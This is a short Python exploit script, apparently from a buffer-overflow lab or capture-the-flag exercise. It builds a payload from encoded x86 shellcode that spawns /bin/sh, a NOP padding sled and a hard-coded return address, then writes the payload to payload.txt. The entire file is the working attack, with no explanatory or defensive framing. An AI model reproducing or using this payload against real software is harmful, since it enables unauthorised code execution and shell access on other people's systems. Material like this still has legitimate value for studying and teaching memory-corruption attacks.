import struct

#old shellcode 
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
# encoded shellcode using x86/call4_dword_xor encoder
buf =  b""
buf += b"\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xd3\x30\x31\x2e\x83\xee\xfc\xe2\xf4"
buf += b"\xb9\x3b\x69\xb7\x81\x56\x59\x03\xb0\xb9\xd6\x46"
buf += b"\xfc\x43\x59\x2e\xbb\x1f\x53\x47\xbd\xb9\xd2\x7c"
buf += b"\x3b\x38\x31\x2e\xd3\x1f\x53\x47\xbd\x1f\x42\x46"
buf += b"\xd3\x67\x62\xa7\x32\xfd\xb1\x2e"

buffer_addr = struct.pack("<I", 0xffffd060)  
padding = b"\x90" * (140 - len(buf)) 

payload = buf + padding + buffer_addr

with open("payload.txt", "wb") as f:
    f.write(payload)

print(f"payload ready {len(buf)}")
